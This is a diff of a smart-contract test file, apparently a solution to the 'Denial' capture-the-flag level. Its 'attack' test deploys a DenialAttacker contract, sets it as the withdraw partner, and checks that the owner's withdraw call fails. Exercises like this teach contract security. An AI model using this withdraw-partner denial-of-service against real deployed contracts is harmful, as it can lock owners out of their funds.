@@ -20,18 +20,20 @@ describe('Denial', () => {
 
     let tx = await owner.sendTransaction({
       to: contract.address,
-      value: utils.parseEther('100'),
+      value: utils.parseEther('0.001'),
     });
     await tx.wait();
-
-    // let tx = await contract.setWithdrawPartner(attacker.address);
-    // await tx.wait();
-
-    // tx = await contract.withdraw();
-    // await tx.wait();
   });
 
   it('attack', async () => {
-    expect(true).to.equal(false);
+    const AttackerFactory = await ethers.getContractFactory('DenialAttacker');
+    const attackerContract = await AttackerFactory.deploy();
+    await attackerContract.deployed();
+
+    let tx = await contract.setWithdrawPartner(attackerContract.address);
+    await tx.wait();
+
+    tx = contract.connect(owner).withdraw({ gasLimit: 1000000 });
+    await expect(tx).to.be.rejectedWith(Error);
   });
 });
